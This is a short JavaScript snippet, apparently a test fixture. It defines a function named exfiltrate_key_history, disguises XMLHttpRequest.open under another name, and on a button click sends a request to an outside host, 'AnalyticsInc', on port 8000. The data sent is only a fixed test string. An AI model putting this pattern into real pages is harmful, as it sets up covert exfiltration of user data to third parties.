function exfiltrate_key_history() {
  xmlhttp = new XMLHttpRequest;
  var v0 = xmlhttp;
  var v2 = xmlhttp.open;
  var v3 = v2.bind(xmlhttp);
  v0.opennew = v3;
  xmlhttp.opennew("GET", "http://AnalyticsInc:8000/submission.html?test=clone2", true);
  xmlhttp.send(null);
  return
}
var v1 = document.getElementById("test");
v1.onclick = exfiltrate_key_history;
